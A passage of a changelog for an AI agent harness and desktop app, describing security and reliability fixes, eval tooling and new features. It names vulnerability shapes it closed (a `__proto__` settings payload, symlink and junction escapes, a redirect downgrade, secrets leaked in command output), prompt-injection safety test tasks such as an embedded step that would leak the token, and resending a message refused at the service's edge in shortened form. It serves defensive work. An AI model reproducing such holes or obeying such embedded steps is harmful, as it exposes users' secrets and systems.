  it, one truncated the bytes the other had written, and the second's rename
  failed with `ENOENT`: a lost update, with the in-memory state left stale
  behind it. The temp name is unique per write, the file is opened
  exclusively (a name another user planted as a symlink is a clean failure,
  not a write THROUGH it), the bytes and the directory are fsynced, and the
  inline copies of the swap are gone
  (`aipass-bridge/harness/atomic-write.mjs`, `harness/settings.mjs`,
  `harness/providers.mjs`).
- **The state stores are owner-only.** The memory and symbols stores were
  `0644` in `0755` directories while the session store next to them was
  `0600` in `0700` — and they hold the model's durable project facts and
  every indexed source and symbol name
  (`aipass-bridge/harness/memory-store.mjs`, `harness/symbols.mjs`).
- **A settings file cannot hijack a prototype.** `Object.assign` replaces the
  prototype of its target, so `{"compaction":{"__proto__":{…}}}` in
  `settings.json` replaced the compactor's prototype and every run that
  reached the context limit died with `needsCompaction is not a function`.
  The dangerous keys are stripped where the settings enter
  (`aipass-bridge/harness/settings.mjs`).
- **The installer bounds what it downloads.** The size caps were checked
  AFTER the bytes were in memory or on disk (a chunked response could push
  anything into the heap before the 1 MB cap fired; a whole repository was
  copied before the 8 MB cap was evaluated; a symlink in `node_modules`
  pointing at `C:\` copied the drive), and the `http://` refusal ran only on
  the first URL, so an `https://` link could hand the download to a plain one
  in a redirect. The caps hold while the bytes stream, the protocol policy is
  checked on every hop, and a link out of the tree is refused rather than
  resolved (`aipass-bridge/harness/install.mjs`).
- **The container deployment starts.** `AIPASS_HOST=0.0.0.0` was set in
  every deploy file and `AIPASS_ALLOW_REMOTE=1` in none, so the bridge
  refused to bind and supervisord restarted it forever
  (`aipass-bridge/deploy/`).

- **A run does not stand still at a refusal.** The message that carries a tool
  result was refused by the upstream edge, and the run sat in the wait ladder
  — 60 s, then 180 s, then the split — for minutes before it could go on. The
  window showed a run that had stopped: the session ended right after the last
  tool call, with no answer and no `run_stats`, because the window was closed
  while it waited. A big message is now sent again *shorter*, at once: the
  head and the tail survive, the middle is left out with a line that says so,
  and the run's next step happens. A small message is never shortened (that is
  the pace case, and the wait is its medicine), and neither is the run's first
  message — that one carries the protocol (`harness/bridge.mjs`,
  `harness/loop.mjs`, `test/run-resilience.test.mjs`).
- **The chat tab opens in Chrome, and the test suite closes what it opened.**
  The page was opened in the platform's default browser, so a Windows machine
  opened it in Edge — where the extension is not, and the run stopped with
  "no de.aipass.net tab is open". The rule is Chrome now (the platform
  default is only the fallback for a machine with no Chrome at all), and the
  browser the suite opens is an instance of its own: a private profile, a
  process tree of its own. The suite closes that tree when the run ends, so a
  test run no longer leaves a window on the developer's desktop, and the
  Chrome they are using is never the one that gets closed
  (`harness/open-command.mjs`, `harness/browser.mjs`, `harness/rpc.mjs`,
  `desktop/main.mjs`, `setup.mjs`, `scripts/test.mjs`,
  `test/platform.test.mjs`).
- **The suite takes a port the OS picks.** A test backend used to probe a free
  port and then bind it, and the window between the two is one another
  process can walk into: with three suites on one machine — which this
  repository's sessions do — a file could fail for a reason that had nothing
  to do with the code. The backend now takes port 0 and reports the port it
  actually got, so the race is not possible at all (`harness/rpc.mjs`,
  `test/harness.mjs` and the test files that start a backend).
- **`/symbols` answers instead of pointing.** The command promised a listing
  and printed "use SYMBOLS in an agent run" instead — so the palette offered
  something it did not have. It asks the backend for the same code-navigation
  index the markers use: what a file declares, or where a name is defined and
  where it is used (`harness/rpc.mjs`, `desktop/ui/app.js`,
  `test/desktop.test.mjs`, `test/ui.test.mjs`).
- **A key on the "แนบ" button attaches the file.** The file row is a button
  and the attach button inside it is a button too, and the row's key handler
  swallowed the key and cancelled the inner button's own activation: Enter
  opened the file instead of attaching it, so a keyboard user could not attach
  anything from the panel. A key on a control inside a row is that control's
  business now (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **The settings sheet stops its meter when it closes.** The meter's timer was
  written into the modal's dataset and never read, so every "คืนค่าเดิม" —
  which closes the sheet and opens it again — left another one polling the
  backend forever (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **A failed action says so.** The button paths had no error handling: a
  rejected call was an unhandled rejection in the console and nothing at all
  on screen. Apply, Discard, the session buttons, the model and provider
  pickers, plan mode and the settings reset all say what went wrong now
  (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **The "auto" theme follows the system.** The system's choice was read once
  and then went stale — a machine that goes to bed at sunset kept the wrong
  theme until the window was reloaded. The window listens to the media query
  now, and reads it safely when the browser has no `matchMedia` at all
  (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **The settled layer is appended to, never rewritten.** Every paragraph that
  closed reassigned the settled layer's `innerHTML`, so the browser re-parsed
  everything already on screen and the cost of a frame grew with the answer.
  It is appended to now (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **The search field does one call, not one per keystroke.** Typing in the
  history filter issued a round trip and rebuilt the whole list for every
  character; it waits a moment now (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **The header asks once.** Refreshing the header asked the backend for its
  status twice — once for the header and once for the context meter — every
  ten seconds (`desktop/ui/app.js`).
- **The window says what it is to a screen reader.** The sheet is a dialog
  (and it takes the focus with it, and gives it back), the transcript is a
  live region, the palette is a listbox and the composer says which row is
  on it, the composer has a name, the icon buttons have names, and a machine
  that asks for less motion gets no animation and not only no transition
  (`desktop/ui/index.html`, `desktop/ui/styles.css`, `desktop/ui/app.js`,
  `test/desktop-window.test.mjs`, `test/ui.test.mjs`).
- **A 401 refreshes the token, and the retry carries the new one.** The
  window's request headers were built once, before the call — so when the
  boot fetch lost a race and the window fetched the token again, the retry
  went out with the OLD token and failed with the same 401. The headers are
  built per attempt now, and a test pins it
  (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **The suite is green under load.** The stability pin that a command's
  process tree dies with its timeout left 600 ms between the timeout and the
  grandchild's write; on a busy machine — this repository's suites run in
  parallel with other sessions' — the kill could lose that race and the
  marker landed. The margin is generous now: the pin is about the kill, not
  about how fast a machine kills a tree
  (`test/stability.test.mjs`).
- **An "always" answer is not a permanent yes.** The permission engine checked
  the remembered grants FIRST — before the user's own path rules and before
  the secret floor. A grant is written to the rules file and re-seeded on
  every start, so a `deny` rule the person added later never took effect, and
  a grant given to a secret file outlived the rule that had allowed it. The
  grants now sit under the user's rules and under the secret floor, and still
  beat the safety floor and the mode: "always" means always, but it cannot
  outlive a rule, and a secret file is denied in every mode whatever the
  answer was once (`harness/permissions.mjs`, `test/permissions.test.mjs`).
- **The window is served under a policy.** The backend sent the UI's files
  with no `Content-Security-Policy` at all — and the shell's declaration
  covers the asset protocol, which this window does not use, because it is
  loaded from the backend over plain HTTP. The policy is now served by the
  backend (`harness/rpc.mjs`, `WINDOW_CSP`), the shell declares the same
  policy key for key, and a test says the two cannot drift. The remote
  images and videos the markdown renderer draws are allowed again: the
  shell's old declaration blocked them, so a model's picture worked in the
  browser and vanished in the packaged app (`desktop/src-tauri/tauri.conf.json`,
  `test/hardening.test.mjs`, `test/desktop.test.mjs`).
- **The page is granted no more than it uses.** The Tauri capability set
  handed the page `core:default` — the tray, the menu, path resolution and
  the devtools toggle — and `withGlobalTauri` put the whole API on
  `window.__TAURI__` in a document loaded over plain HTTP. The page uses no
  Tauri API at all (the Rust side owns the window, the tray and the sidecar),
  so the blanket set is gone, the global is off, and what remains is window
  and event commands only (`desktop/src-tauri/capabilities/default.json`,
  `desktop/src-tauri/tauri.conf.json`, `test/hardening.test.mjs`).
- **A body over the cap is answered, not dropped on the floor.** A `/rpc`
  body past the cap destroyed the request without a word, so the client saw
  a transport error it could not read and the window's "attach" of a large
  file looked like the app had crashed. The answer goes out first — a 413
  that says what the cap is — and the socket is closed after it. The cap
  itself is 64 MB, which fits a couple of 20 MB attachments in base64
  (`harness/rpc.mjs`, `test/desktop.test.mjs`).
- **The window cannot be made to read a huge file, or a binary one as text.**
  `fs.read` had no size cap and no binary guard: a 500 MB log in the project
  filled the backend's memory, and a PNG read as UTF-8 is a screenful of
  mojibake. It now refuses both, with the same cap and the same binary
  refusal the tool layer uses for the model (`harness/rpc.mjs`,
  `test/desktop.test.mjs`).
- **Two windows on two projects cannot touch each other's work.** The backend
  holds one harness per project, and the window said nothing about which one
  it was showing — so the window that spoke last decided what the other one
  read. Window A on project A saw project B's sessions, file tree, context
  meter and **pending diffs**, and its **Apply** button wrote project B's
  staged edits to project B's disk while the header still said "project A".
  Every call now carries an `x-aipass-project` header, and the backend answers
  for that project: the scope is looked up, never switched to, so a call is a
  target and not a move of the machine's current project. A method that names
  its own project still wins — the header says *who* is asking, the parameter
  says *what* the call is about (`harness/rpc.mjs`, `desktop/ui/app.js`,
  `test/desktop.test.mjs`).
- **The launcher finds a backend that is already running.** The backend's
  `/rpc` is behind the loopback token, so a probe without one got a 401 — and
  a launcher that only accepted a 200 never saw the running backend. It
  started a second one, hit `EADDRINUSE`, and the window opened on "port 8790
  is busy" — which reads as "the app does not open". `--detach` (the path
  `tauri:dev` takes) failed the same way. The probe sends the token, and a
  401 carrying the backend's own refusal still counts as ours; a 401 that is
  not ours is somebody else's server, and the busy-port message still says so
  (`harness/backend-probe.mjs`, `desktop/main.mjs`, `test/desktop.test.mjs`).
- **A relative attachment path is relative to the project.** The window's file
  panel hands over project-relative paths, and they resolved against the
  folder the *backend* started in — so **แนบ** and `/file <path>` failed for
  every project except that one, and for every project right after a switch.
  They now resolve against the project the call is about
  (`harness/rpc.mjs`, `test/desktop.test.mjs`).
- **A session id is matched whole.** Every session file is named
  `session-<id>.jsonl`, and the lookup was a substring match: a one-character
  id matched the first session in the store, so `session.delete {id:"a"}`
  deleted a session nobody named. The name is now matched exactly, and the
  lookup is scoped to the project the caller named
  (`harness/session.mjs`, `harness/harness.mjs`, `test/desktop.test.mjs`).
- **A file the human unticked stays unticked.** The pending panel is rebuilt
  on every diff frame and again when the run ends, and it re-ticked everything
  it drew — so a file the human had said no to came back ticked, and the
  Apply button wrote exactly the files they refused
  (`desktop/ui/app.js`, `test/ui.test.mjs`).
- **The packaged app no longer wipes the settings file.** The migration from
  the legacy `desktop.json` wrote `{"root": …}` over `settings.json` — the
  mode, the model, the compaction budget, the path rules and the project list
  all went with it — and it deleted the legacy file whether or not the write
  landed. The migration merges one key into the file it finds, and the legacy
  file goes only after the write succeeded
  (`desktop/src-tauri/src/main.rs`, and the three `cargo test` cases beside
  it).
- **The test suite no longer writes into the real `~/.aipass`.** The
  cross-session memory store named its directory when the module loaded, so a
  suite that pointed `AIPASS_HOME` at a scratch home *after* that import still
  wrote there: one file per temp root (the file name is a hash of the project
  path), every run, and a developer's real store filled with hundreds of
  fixture facts that no project ever read back. The store now resolves its
  directory when it is used, the suite runner hands the whole run a scratch
  home of its own, and a pin asserts the store lands in the home it was given
  (`scripts/test.mjs`, `harness/memory-store.mjs`,
  `test/data-integrity.test.mjs`).

- **The suite no longer leaves scratch behind.** Two families of scratch grew
  with no sweep: the per-file home floor in `test/harness.mjs` (a directory per
  test file) and `tempDir()` (a directory per call) — 6,200 and 147,000
  directories, 165 MB in the temp directory over a week of runs. Both go when
  the process exits, through one hook rather than one per call (a per-call
  hook would trip Node's listener warning mid-suite), and the runner sweeps
  the scratch that earlier runs left behind — older than an hour, so a
  parallel session's in-flight run is never touched
  (`aipass-bridge/test/harness.mjs`, `scripts/test.mjs`).

- **The markers the preamble promises now run.** Three dead ends of the same
  shape — a feature written and never wired. `SYMBOLS`, `DEF`, `REFS` and
  `JOBS` were in the preamble, in the marker grammar and in the tool table,
  but the parser had no rule for them: a reply that used one lost the line
  (the grammar strips it from the prose) and produced no call at all, so the
  model was nudged about a marker it had spelled exactly right. A `SUBAGENT`
  with `background: true` answered `err: backgroundJobs is not defined` — the
  job table lived inside the run, while the function that starts a helper is a
  module-level one, so no helper could be polled and no result could ever be
  injected. And the spill locator named a line range guessed from the byte
  cap (80 characters a line): on long-lined files the guess pointed past lines
  the model had never seen, and the range it handed back skipped them for
  good. The code navigation is a marker-to-tool path again, a background
  helper starts, polls and lands its result in the next turn, and the locator
  starts where the head really ended
  (`harness/protocol.mjs`, `harness/loop.mjs`, `harness/tools.mjs`,
  `harness/symbols.mjs`, `desktop/ui/markers.js`, `test/symbols.test.mjs`,
  `test/protocol.test.mjs`, `test/harness-fixes.test.mjs`,
  `test/tools-aci.test.mjs`, `test/ui-markers.test.mjs`).

- **A playbook that exists is a playbook that runs.** The library's index was
  the folder's `index.md` — a person's prose — so a part added yesterday was
  invisible until someone remembered to edit that prose, and the terminal and
  the window disagreed about which library a name came from. The index is now
  the curated preamble *plus* the generated list of what is on disk, and one
  order serves every surface: the folders named in `skillsDirs`, then the
  project's own, then the user's, then the shipped one. The folders are read
  on every ask, so a part dropped in while the app is open shows up when the
  window comes back (`harness/skills.mjs`, `harness/rpc.mjs`,
  `desktop/ui/app.js`, `test/skills.test.mjs`).
- **The sandbox stopped pretending to be a wall.** Three holes, all measured:
  a command's OUTPUT was never screened for secrets (the command was screened
  for secret FILES, but `set` prints the whole environment — with any API key
  in it — straight into the transcript and upstream to the model); the
  containment check was a string prefix, so on Windows a path that differs
  only in case was refused as "outside project root" while a junction inside
  the project that pointed elsewhere was followed without a murmur; and the
  projection — a copy of the user's source, and of whatever secrets it holds
  — lived inside the project, where a `git add -A` could commit it. Now: the
  output is screened by token shape and by the name of the variable it
  carries (`harness/output-scrub.mjs`); the boundary is lexical
  (`path.relative`, the same fix `rpc.mjs` already had) AND physical (a link
  out of the project is a link out of the root); the projection lives under
  `~/.aipass/run/`, with a janitor that collects what a killed backend left
  behind; a link that points outside the project is left out of the
  projection; a file over the size cap is left out and named; and the heavy
  directories the projection SHARES with the real tree are named in the
  command's result, so a write into `node_modules` is never a surprise
  (`harness/output-scrub.mjs`, `harness/overlay.mjs`, `harness/sandbox.mjs`,
  `harness/tools.mjs`, `harness/harness.mjs`, `test/sandbox.test.mjs`).
- **The stop button stops the work, not just the conversation.** Pressing stop
  reached exactly one place: the next send, whose fetch rejected with an
  `AbortError`. Everything else carried on — the tools of the reply that was
  running went on one after another, a `RUN` kept its command and its process
  tree alive for up to two minutes, the context summariser went on asking the
  model for a summary nobody wanted, and a stop that landed between "the run
  started" and "the run's abort controller exists" was lost outright (it
  aborted the *previous* run's controller, and the run that had just started
  went on with a fresh, un-aborted one). The stop now reaches every wait: the
  loop checks the signal between tools and between steps, a command in flight
  is killed with its tree, the summariser rides the same signal, and the
  run's controller is created before the first `await`, so a stop can never be
  lost. The window says what happened: the button reads "กำลังหยุด…" the
  moment the backend hears the stop, the run ends as `cancelled`, and a stop
  that found nothing to stop says so instead of pretending. The remaining
  waits are stop-aware too: the projection a `RUN` waits for, the web search,
  an MCP call the server never answers, and the edits a stopped run would
  otherwise stage.
  (`harness/loop.mjs`, `harness/harness.mjs`, `harness/tools.mjs`,
  `harness/compact.mjs`, `harness/sandbox.mjs`, `harness/mcp.mjs`,
  `harness/rpc.mjs`, `desktop/ui/app.js`, `test/stop.test.mjs`,
  `test/ui.test.mjs`, `test/desktop.test.mjs`, `test/mcp.test.mjs`).
- **The edge's refusals stop being an episode.** A pace-shaped 403 from the
  Cloudflare edge in front of de.aipass.net was answered with a five-second
  pause, then fifteen, then ten, then thirty, then sixty — five probes inside
  the very window they were waiting for, which is how a hot window never
  drained. A run that drew one sat in "[403] refused at the edge — waiting 5s"
  for minutes: recorded live, one benign tool result refused for 90 seconds
  straight while the same bytes were asked for again and again, until someone
  cancelled it. The refusals now wait like rate refusals do (the page 15s then
  60s, the client 60s then 180s — the same ladder a 429 gets), the whole tab
  drops to the edge's own envelope after a refusal (one send every 20s, about
  twelve in four minutes, where the old 3s gap was eight times faster than the
  limiter allows and kept every episode going), every send in the tab keeps a
  two-second floor so two senders cannot put their requests on the wire inside
  the same second, the conversation create waits on the same clock instead of
  firing back-to-back with the first message, and a resend says so with
  `x-ai-retry` — the header the site's own client uses, so the server can tell
  a repeat from a second turn (`extension/page.js`, `harness/bridge.mjs`,
  `test/page.test.mjs`).
- **A project entered after a settings save no longer runs the old values.**
  `settings.set` re-applied the saved values to the current harness only — a
  project visited before the save kept the temperature, budgets and path rules
  of that moment, while the sheet (and every window) said the new ones were in
  force. Every live harness now follows a save (a model picked in the window's
  header — `config.set` — included: it writes the same `defaultModel` the sheet
  does), a project switch re-seeds the harness being entered from the settings
  file (a value changed by a CLI while the backend ran is picked up there too),
  `rules.set` reaches every engine, and `settings.reset` resets every harness
  instead of one (`harness/rpc.mjs`, `test/data-flow.test.mjs`).
- **A torn session header no longer costs the session.** The header rewrite is
  an in-place 2 KB write (`HEADER_WIDTH`) — the crash window traded away for
  O(1) rewrites — and a power loss mid-write could leave a first line that no
  longer parsed. That used to be a session lost: the picker skipped it and
  `load()` returned null while the entries sat on disk with nobody able to
  open them. The same header now goes to a sibling `.hdr` breadcrumb
  (atomically) before the destructive write; readers fall back to it, `load()`
  writes it back so the next open reads the file the ordinary way, and a
  completed rewrite deletes it (`harness/session.mjs`,
  `test/data-integrity.test.mjs`). The picker's header test is now
  `type: "header"` like `load()`'s — an entry line (every entry has a string
  `id`) used to list as a row that then refused to open.
- **Rules, memory facts and applied edits swap, not overwrite.** `rules.json`
  and the memory store wrote the whole file in place — one bad moment lost
  every project's permission rules or all cross-session facts, and a failed
  memory save read back as "a fresh project". Both, plus
  `overlay.applyToDisk` (which writes user files and keeps no backup), now go
  through the shared temp-file-plus-rename in `harness/atomic-write.mjs`; an
  applied edit keeps the mode it replaced, so the exec bit on a script
  survives the swap (`test/rules.test.mjs`, `test/data-integrity.test.mjs`).
- **Railway to green: the two dead lanes.** Every macOS job since the
  run-overlay tests landed failed one test: `restorePaths` swapped only the
  literal sandbox path, while macOS hands a child the canonical form
  (`/private/var/…` for anything under `/var`) — so a sandbox path leaked
  into RUN output and the swap no longer hid it
  (`aipass-bridge/harness/sandbox.mjs`, regression in
  `test/run-overlay.test.mjs`). Two Windows jobs failed on `a fresh token is
  minted`: the mint path never refreshed the token memo, so a delete +
  re-mint inside one clock tick reported the old mtime:size stamp and the
  cache answered with the revoked token (`aipass-bridge/harness/authtoken.mjs`,
  regression in `test/auth.test.mjs`).
- **`loadConfig` de-duped MCP servers backwards.** Its own comment said
  project overrides home; the code kept home first. The project entry now
  wins whole-entry, as documented — the same server name could silently run
  the home command instead of the project one (`harness/mcp.mjs`).
- **Log spam, three sources.** The credits line logged every 10s poll —
  thousands of identical lines a day — now only on change. The extension
  SSE cycle (every ~4 min) logged a connect/disconnect pair each time — now
  only the 1↔0 edge. A second bridge starter exited 1 with a wall of red —
  now exits 0 with one line a minute at most (`test/bridge.test.mjs`).
- **The supervisor names the death.** A backend crash used to log only
  `restart attempt N`; the note now carries the exit status, and a loop past
  five straight failures says so instead of adding another identical line
  (`desktop/src-tauri/src/main.rs`).
- **`session.remove()` reported backwards.** It returned `existsSync()` after
  deletion — `false` on success reads as "still there". Now returns whether
  the file is gone (`test/data-integrity.test.mjs`).
- **One root file, not two.** The Rust shell read `settings.json` then
  `desktop.json` — two files that could disagree. `desktop.json` now
  migrates into `settings.json` once and is removed.

- **A failed send leaves a trace.** A run that stops because a send threw
  now records the cause in the session (a `note` entry and
  `run_stats.sendError`) instead of losing it, so the next failure names its
  shape (`test/harness-fixes.test.mjs`).
- **`maxCredits` — a spend cap per run.** The loop counts observed spend
  against the bridge's cached quota (0 = off, the default) and stops a run at
  the ceiling with the stop reason `credit-limited`. Set it in Settings, in
  `settings.json`, or per eval task / `--budget maxCredits=`.
- **The secret floor covers the execution channels.** A RUN whose command
  spells a secret path is refused before anything spawns, SEARCH skips secret
  files even when their names are not dot-hidden, and git patches touching a
  secret are withheld from output (the runtime residual — a name built at
  runtime inside a program — is stated in `SECURITY.md`).
- **Plugin API versioning.** `plugins.mjs` exports `PLUGIN_API` (1); a plugin
  whose `apiVersion` needs a newer harness is refused at load before
  `setup()` runs, and a plugin without one loads as `apiVersion: null`.
- **Reliability targets get a home** (`docs/RELIABILITY.md`): the SLIs the
  commands already print, a zero-warn error budget at release time, and the
  degradation modes indexed. `run_stats` now records the model it ran on,
  and `stats` groups by model and project — `byModel` / `byRoot` in `--json`,
  new `models:` / `projects:` lines in the text report, models in the HTML
  header.
- **The backup/restore drill runs in the suite**
  (`aipass-bridge/test/restore-drill.test.mjs`): a copied home restores into
  a second environment with the same sessions, settings and token; RTO/RPO
  are written down in `docs/DATA_FORMATS.md`.
- **A new default model is an audited change** (`docs/SPEC_EVALS.md`):
  approval gates (safety set solved, no regression, ≤2× cost), the routing
  policy in one place, and "no automatic fallback" stated where it can be
  found; the evals summary gains a `wall median`.
- **`SECURITY.md` grows the governance half**: data classes, owners, threat
  model, and the vulnerability process — triage → fix with test → verify
  closure → announce; `docs/RELEASE.md` gains the release-evidence pack.
- Session headers record `app` — the build that wrote the file — so a
  transcript answers "which version did this come from".
- **`npm run stats -- --alerts / --strict / --json / --html FILE`** — the
  pull-based alerting a local install can have: refusal-rate spikes,
  guard-trip shares, cost outliers and firewall notes, plus a self-contained
  HTML report.
- **`npm run loadtest`** — concurrent local-API smoke with latency and
  memory reporting (`--strict` for release gates). Not part of CI.
- **Evals: `--attempts N`** repeats every task in one run and reports every
  row (the stochastic-run policy: medians, never the best draw), the summary
  gains a `grounded` metric (DONE runs a declared check confirmed), and the
  safety set ships: `refuse-secret` and `ignore-injection`, live-only.
- **Structured log lines + request ids.** `AIPASS_LOG_FORMAT=json` turns
  bridge logs into one JSON object per line; every bridge request carries a
  short `x-aipass-rid` that rides its error lines.
- `docs/RELEASE.md` (versioning, acceptance criteria, upgrade/rollback,
  dependency review), `.github/dependabot.yml`, and tests for data integrity
  (torn/duplicated/wrong-typed lines, settings forward-compatibility) and
  concurrent RPC bursts.
- **The experiment queue** (`docs/EXPERIMENTS.md`, `experiments/queue.json`,
  `npm run experiments`): proposals come from alerts, regressions, research
  or audits; every record carries a hypothesis, baseline, success criteria,
  budget and stop rule, and one that ends without a `result` fails
  validation. Ordered 2×impact − risk − cost; seeded with eight open records,
  from mixed-model routing to the elision tier.
- **The context manager's two newer tiers.** The summarisation transcript
  elides stale, bulky sends to counted head…tail stubs instead of the plain
  1200-char slices (`elideStaleResults` / `AIPASS_ELIDE` — off by default,
  so the `elision-tier` arm measures it against the current default). Every
  rotation also extracts a `MEMORY:` facts section from the summary reply —
  decisions, constraints, files — merges it across rotations (deduped,
  clipped, capped at 20), records it on the compaction entry, and pins it
  into every later seed, so a long session keeps its spine across any number
  of rotations (`carryMemory` / `AIPASS_MEMORY=off`; queue:
  `memory-tier-carry`).
- **`npm run evals:compare`** — two result JSONLs in, one verdict out. The
  model-approval gates (regression floor, safety set, ≤2× spend, a 3-attempt
  sample floor) are exit codes instead of judgment; `--json` for the record.
- **Eval rows carry their dataset versions** — `taskDigest`, `treeDigest`,
  an `env` stamp (`app`, `node`, `platform`) — plus the task's `category`;
  the summary gains `by category:`, `mixed outcomes:` and `pair drift:`
  lines. The set gains two phrase-robustness twin pairs (`sum-numbers`,
  `count-lines`), and `--keep` copies every attempt's session JSONL beside
  the run results, so evidence outlives `%TEMP%`.
- **The safety set doubles and gets twins**: `refuse-run-leak` (an embedded
  "ops step" that would stage the token through RUN) and `allow-clean-run`
  (the false-positive twin — a clean RUN that must go through). All four
  safety tasks are `liveOnly` (replay skips them); FP/FN criteria and the
  30-day expiry of safety evidence live in `docs/SPEC_EVALS.md`.
- **`docs/MATURITY.md`** — the capability map: production vs experimental vs
  not shipped (and one "won't build"), each with the criteria that would
  change its status and an owner role.
- **The test plan's L1 cases are implemented** (`docs/TEST_PLAN.md`): digests
  pinned stable across runs and moving with a fixture byte, a dead bridge
  marked `invalid` (never `unsolved`), the summary's empty slices staying
  quiet, piped/composed secret spellings refused, literal metadata hosts
  resolving private without a network round trip, a summary-less `compaction`
  marker loading, unknown entries surviving a rewrite, the queue's `--json`
  order — and the comparator's new-task/wall/old-shape cases.
- **The suite runs on macOS in CI** — `macos-latest` joined the matrix
  (Node 22/24), so the second platform the app ships for is exercised on
  every push. The platform→argv rule (`open` / `cmd start` / `xdg-open`)
  moved to `harness/open-command.mjs` and the sidecar triple table became
  injectable (`targetTriple()`), so a Windows dev machine pins the darwin
  branches in `platform.test.mjs`: the argv shape on all three OSes, the
  `browser.open` allowlist refusing before any spawn, and the mac sidecar
  names (`x86_64-apple-darwin` / `aarch64-apple-darwin`).
- **Per-tool latency in `run_stats`.** Each tool kind's entry gains `ms` (its
  wall time; parallel SUBAGENTs are timed at their fan-out) and `npm run
  stats` prints the per-kind mean next to the refusal count; `run_stats.turns`
  records the reply count that `steps` (executed calls) never named.
- **The red-test commit gate.** A `git commit` RUN is refused while the
  project's declared check (`.aipass/check.txt`, `docs/SPEC_CHECKER.md`) has
  not passed at the current tree state — any change re-arms it, the refusal
  names the exact command that un-bars it, and `run_stats.commitBlocks` counts
  the refusals. Projects without a declared check are untouched.
- **`--snapshot`** quotes `git status --short` and the `package.json` scripts
  into turn 1 — off by default, so the CLI's tuned turn-1 bytes stay identical
  (`agent.test.mjs` pins both sides).
- **Plugin tools can declare a risk** — `ctx.tools.register(marker, fn,
  {risk: 'write'|'shell'})` routes the marker through the same permission
  gate a built-in of that kind rides; undeclared tools keep the trust the
  plugin model states (`plugins.test.mjs`, `gates.test.mjs`).
- **Temperature is a knob now.** `temperature` (0..2, null = the server's
  per-model default) lives in `settings.json`, rides every send as
  `temperature`, and is edited from the composer's temperature chip beside the
  effort chip (`agent.test.mjs`, `chat.test.mjs`, `bridge.test.mjs`,
  `ui.test.mjs`). The bridge clamps out-of-range values and drops a value
  that is not a number, with a warning. The sampling fields the bridge cannot
  forward (`top_p`, `max_tokens`, `presence_penalty`, `frequency_penalty`,
  `seed`, `stop`, `logit_bias`, `logprobs`, `response_format`,
  `reasoning_effort`, `top_k`, `n`) are no longer ignored silently: one
  `warning:` line names them per request (`bridge.test.mjs`). The outer API
  (`/v1/chat/completions`) still ignores everything else, now documented as
  such (`docs/DOCS.md`).

- **MCP client (stdio).** `harness/mcp.mjs` speaks JSON-RPC over stdio:
  initialize, tools/list, tools/call. Servers are configured in
  `~/.aipass/mcp.json` or `<project>/.aipass/mcp.json`; each tool is
  exposed to the model as `MCP__<server>__<tool>` and merged into the
  plugin table. A server that fails to connect is skipped, never fatal.
  `aipass mcp [list|call]` inspects and calls them.
- **Code navigation (SYMBOLS / DEF / REFS).** A zero-dependency,
  regex-based symbol index (`harness/symbols.mjs`, 15+ languages) cached
  under `~/.aipass/symbols`, refreshed on mtime change. The model can list
  a file's declarations, find a definition, and find references.
- **Cross-session memory.** Facts persisted per project in
  `~/.aipass/memory/<project-hash>.json` and loaded into a new session's
  first turn; persisted on compact/rotate. `aipass memory [list|clear|path]`.
- **Background subagents.** A `SUBAGENT` with `background: true` starts and
  returns a job id at once; results are polled with `JOBS` or injected
  into a later turn. No nesting.
- **Test-time scaling.** `aipass scale "task" [--n N]` runs the task N
  times and keeps the best by check verdict (`Harness.scale`).
- **UX pass over the window and the popup** (design record: `docs/UX.md`).
  The extension popup's Advanced section gains **Paste from clipboard** and
  **Test connection**; the desktop gains `/memory`, `/mcp`, `/symbols` and a
  **memory panel** (facts carried across sessions + forget-all, via new
  `memory.list` / `memory.clear` / `mcp.list` RPC methods); sessions, playbooks
  and files rows are keyboard-operable; a run in flight pulses the composer
  hint; the six most common loop failures are translated to Thai with the next
  action; the hardcoded user card is gone; the theme toggle shows the theme it
  will switch to.

### Changed

- **The app's icon is the app's own logo.** The icon was a blue pixel letter
  'a' on a dark square while the window drew a terracotta rounded square with
  a four-point star — two marks for one product, and the pixel one is what
  the task bar, the Start menu, the installer and Explorer's file list
  showed. The icon is the window's mark now, drawn by the generator that
  already wrote the PNGs: the shapes are sampled 8x per pixel and averaged,
  so the edges are smooth at every size instead of stair-stepped, and the
  smallest sizes get slightly thicker arms, because at 16 pixels the window's
  arms are thinner than a pixel and the star would be a white blob. The
  macOS tray template is the star by itself
  (`desktop/src-tauri/icons/make-icons.mjs`, `desktop/src-tauri/icons/*`).
- **The shell reads `AIPASS_HOME` the way the Node side does.** The Node
  side reads it as the `.aipass` directory itself; the Rust shell read it
  as a *home* directory in one place and ignored it in another, so the
  window's log and its "last project" could land outside the directory the
  rest of the app was using. Now one override means one thing on every
  platform, which is what lets the install ladder run against a scratch
  home without touching the real one
  (`desktop/src-tauri/src/main.rs`).
- **An installed app runs the files it shipped with.** The root lookup
  preferred the directory the crate was compiled in over the install
  directory, so an app installed on a machine that also had a checkout ran
  the checkout's `.mjs` files — a build that is not the one that was
  installed. The install directory comes first now; the compiled-in path is
  what `tauri dev` falls back to
  (`desktop/src-tauri/src/main.rs`).
- **The window has one tray icon, not two.** The config declared a tray
  icon and the Rust side built another one with the menu on it, so the
  system tray showed the app twice. The config's tray is gone; the one
  with the menu stays, and on macOS it is a template image — the menu bar
  draws it as a mask, so the mark is the star by itself
  (`desktop/src-tauri/tauri.conf.json`, `desktop/src-tauri/src/main.rs`,
  `desktop/src-tauri/icons/make-icons.mjs`).
- **The bundle set belongs to the platform, not to one config.** The NSIS
  target was the only one the config named, so `tauri build` on a Mac tried
  to build a Windows installer and the macOS and Linux builds existed only
  as npm-script flags. Each platform owns its bundle set now, in a file next
  to the config (`tauri.windows.conf.json`, `tauri.macos.conf.json`,
  `tauri.linux.conf.json`), which the Tauri CLI merges by itself. The macOS
  one also names the minimum system version and turns the hardened runtime
  on, and the bundle now carries an `Info.plist` that lets the window load
  its own loopback backend under the transport policy on macOS
  (`desktop/src-tauri/tauri.*.conf.json`, `desktop/src-tauri/Info.plist`).

- **The rail lost two rows that led nowhere.** "คู่มือ" and "ปลั๊กอิน" were
  folded headings in the window's left column: clicking one opened a box you
  had to guess at, in a column whose job is the work. The playbooks and the
  panels the plugins draw now live in the settings sheet — the playbooks
  right under the folders they are searched in, and clicking one opens the
  playbook under its own row (no second modal on top of the sheet); the panels
